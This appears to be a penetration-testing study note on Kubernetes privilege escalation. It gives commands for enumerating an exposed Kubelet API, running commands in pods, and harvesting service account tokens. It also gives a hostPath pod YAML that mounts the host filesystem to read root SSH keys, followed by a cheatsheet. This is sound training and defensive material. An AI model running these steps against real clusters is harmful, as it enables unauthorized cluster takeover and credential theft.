# Linux Privilege Escalation – Kubernetes

## Overview

**Kubernetes (K8s)** is an open-source container orchestration platform used to deploy, manage, and scale containerized applications. Originally developed by Google and now maintained by the **Cloud Native Computing Foundation (CNCF)**, it has become the standard platform for orchestrating microservices and cloud-native workloads.

From a privilege escalation perspective, Kubernetes matters because during an assessment we may gain access to:

- a pod
- a worker node
- the Kubelet API
- a service account token
- a misconfigured RBAC role

Any of these can open paths to:

- lateral movement across the cluster
- access to secrets
- host filesystem access
- cluster-admin style control
- extraction of SSH keys or credentials from the underlying host

---

# Core Concepts

## Kubernetes vs Docker

Docker is primarily a **container runtime and packaging platform**.  
Kubernetes is an **orchestration layer** that manages large numbers of containers across multiple systems.

| Function | Docker | Kubernetes |
|----------|--------|------------|
| Primary Role | Container runtime | Container orchestration |
| Scaling | Manual / Swarm | Automated |
| Networking | Simpler | More complex, policy-driven |
| Storage | Volumes | Broad storage abstractions |
| Scheduling | Local | Cluster-wide |

---

## Pods

The fundamental execution unit in Kubernetes is the **pod**.

A pod can contain:

- one container
- or multiple tightly related containers

Each pod gets:

- its own IP
- its own hostname
- its own filesystem context
- shared networking/storage context between its containers

---

# Kubernetes Architecture

Kubernetes is broadly split into:

- **Control Plane**
- **Worker Nodes**

## Control Plane

The Control Plane manages the cluster state and scheduling decisions.

Common components:

| Service | TCP Port |
|---------|----------|
| etcd | 2379, 2380 |
| API server | 6443 |
| Scheduler | 10251 |
| Controller Manager | 10252 |
| Kubelet API | 10250 |
| Read-only Kubelet API | 10255 |

Key responsibilities:

- scheduling workloads
- maintaining desired state
- cluster coordination
- API handling
- authentication and authorization decisions

---

## Worker Nodes

Worker nodes run the actual workloads. They host pods and communicate with the Control Plane.

They are managed through:

- kubelet
- container runtime
- networking plugins
- storage integrations

---

# Security Domains in Kubernetes

Kubernetes security can be broken into:

- **cluster infrastructure security**
- **cluster configuration security**
- **application security**
- **data security**

Important built-in controls include:

- RBAC
- Network Policies
- Security Contexts
- admission control
- service account isolation

Misconfigurations in any of these can create privilege escalation paths.

---

# Kubernetes API

The **Kubernetes API** is the main interface for interacting with the cluster.

The API supports operations such as:

| Request | Description |
|---------|-------------|
| GET | Retrieve information |
| POST | Create a resource |
| PUT | Update a resource |
| PATCH | Partial update |
| DELETE | Remove a resource |

The API server validates and processes these requests.

---

# Authentication and Authorization

Kubernetes supports multiple authentication methods, such as:

- client certificates
- bearer tokens
- authenticating proxies
- HTTP basic auth

After authentication, authorization is typically enforced with **RBAC**.

A user or process may be allowed to:

- list pods
- create pods
- read secrets
- exec into pods
- interact with nodes
- access logs
- modify deployments

Misconfigured RBAC is one of the most important escalation paths in Kubernetes.

---

# Kubelet API

The **Kubelet** runs on each worker node and manages containers on that node.

By default, anonymous access to the Kubelet has historically been a major issue. If enabled or weakly protected, it may allow:

- pod enumeration
- command execution inside pods
- token extraction
- container inspection

---

# Reconnaissance

## API Server Interaction

Check whether the API server is accessible:

```bash
curl https://10.129.10.11:6443 -k
```

Example response:

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "code": 403
}
```

This tells us:

- the API server is reachable
- anonymous access exists at least at the transport layer
- authorization blocked access at `/`

That is still useful because it confirms the endpoint is live.

---

## Kubelet Pod Enumeration

If the Kubelet API is exposed, pods may be enumerable:

```bash
curl https://10.129.10.11:10250/pods -k | jq .
```

Useful details include:

- pod names
- namespaces
- images
- annotations
- container structure
- applied configuration
- timestamps

This can reveal:

- vulnerable images
- internal naming conventions
- namespaces worth targeting
- embedded secrets in annotations or configs

---

## Kubeletctl Enumeration

`kubeletctl` is useful for interacting with an exposed Kubelet API.

List pods:

```bash
kubeletctl -i --server 10.129.10.11 pods
```

Example output:

```text
POD                                NAMESPACE     CONTAINERS
coredns-78fcd69978-zbwf9           kube-system   coredns
nginx                              default       nginx
etcd-steamcloud                    kube-system   etcd
```

---

## Check for Exec Capability

Some pods may allow command execution:

```bash
kubeletctl -i --server 10.129.10.11 scan rce
```

This helps identify which pods are likely usable for command execution.

---

# Command Execution in Pods

If allowed, execute commands inside a pod:

```bash
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

Example output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This is significant because root inside a container may enable:

- secret extraction
- hostPath abuse
- token harvesting
- container escape paths
- movement into more privileged workloads

---

# Service Account Token Harvesting

If command execution is available inside a pod, one of the first things to check is the service account token.

## Extract token

```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

## Extract CA certificate

```bash
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

These allow authenticated interaction with the cluster API.

---

# Enumerating RBAC Privileges

Once a token and CA cert are obtained, enumerate what that identity can do.

```bash
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

This is one of the most important steps in Kubernetes privilege escalation.

Look for verbs such as:

- `get`
- `list`
- `watch`
- `create`
- `patch`
- `delete`
- `exec`

And resources such as:

- `pods`
- `secrets`
- `deployments`
- `nodes`
- `roles`
- `clusterroles`
- `serviceaccounts`

A low-privileged token that can **create pods** is often enough to escalate further.

---

# Privilege Escalation via Pod Creation

If the token can create pods, one common escalation path is to create a pod that mounts the host root filesystem using `hostPath`.

Example YAML:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Apply it:

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 apply -f privesc.yaml
```

List pods:

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 get pods
```

If successful, the new pod now exposes the host filesystem inside the container.

---

# Accessing Host Data from the Pod

Once the pod is live, host files may be reachable through the mounted path.

Example:

```bash
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

Potential targets include:

- `/root/.ssh/id_rsa`
- `/etc/shadow`
- `/etc/passwd`
- `/var/lib/kubelet/`
- kubeconfig files
- application configs
- mounted secrets
- cloud credentials

This can lead to:

- host access
- additional pivoting
- credential theft
- persistence

---

# High-Value Kubernetes Misconfigurations

## 1. Anonymous Kubelet Access
If Kubelet permits unauthenticated requests, it may allow pod enumeration or execution.

## 2. Overly Broad Service Account Tokens
A pod token with `create pods`, `list secrets`, or similar permissions can often be abused.

## 3. hostPath Mounts
Mounting `/` or sensitive host directories into a pod is highly dangerous.

## 4. hostNetwork / hostPID / hostIPC
These options reduce isolation and may assist in host-level compromise or snooping.

## 5. Privileged Containers
A privileged pod removes many container isolation boundaries.

## 6. Weak RBAC
Poorly scoped roles often permit dangerous actions like creating or patching workloads.

## 7. Sensitive Data in Annotations / Configs
Pod metadata often leaks operational details.

---

# Enumeration Checklist

## Cluster/API Recon

```bash
curl https://<target>:6443 -k
curl https://<target>:10250/pods -k
```

## Pod enumeration

```bash
kubeletctl -i --server <target> pods
```

## Check exec capability

```bash
kubeletctl -i --server <target> scan rce
```

## Execute inside container

```bash
kubeletctl -i --server <target> exec "id" -p <pod> -c <container>
```

## Extract service account material

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

## Enumerate permissions

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<target>:6443 auth can-i --list
```

---

# Practical Targets After Initial Access

Once inside a pod or with a usable token, look for:

- service account tokens
- kubeconfig files
- mounted secrets
- cloud provider credentials
- CI/CD tokens
- database credentials
- SSH keys
- internal service endpoints
- etcd exposure
- privileged daemonset/deployment configs

---

# Key Takeaways

- Kubernetes is a rich privilege escalation surface when misconfigured
- an exposed **Kubelet API** can be enough to enumerate or access pods
- **service account tokens** are high-value loot
- RBAC enumeration is critical after token capture
- permission to **create pods** is often enough to escalate
- `hostPath`, `hostNetwork`, and privileged pods are especially dangerous
- root inside a container does **not always** mean host compromise, but with the right mounts or permissions it often leads there

---

# Quick Cheatsheet

## Check API server

```bash
curl https://<ip>:6443 -k
```

## Check Kubelet

```bash
curl https://<ip>:10250/pods -k
```

## Enumerate pods

```bash
kubeletctl -i --server <ip> pods
```

## Execute command

```bash
kubeletctl -i --server <ip> exec "id" -p <pod> -c <container>
```

## Get token

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## Get CA cert

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

## Enumerate RBAC

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 auth can-i --list
```

## Create pod from YAML

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:6443 apply -f privesc.yaml
```

---

# Tags

#linux
#privilege-escalation
#kubernetes
#k8s
#containers
#kubelet
#rbac
#service-account
#container-escape
#enumeration
#obsidian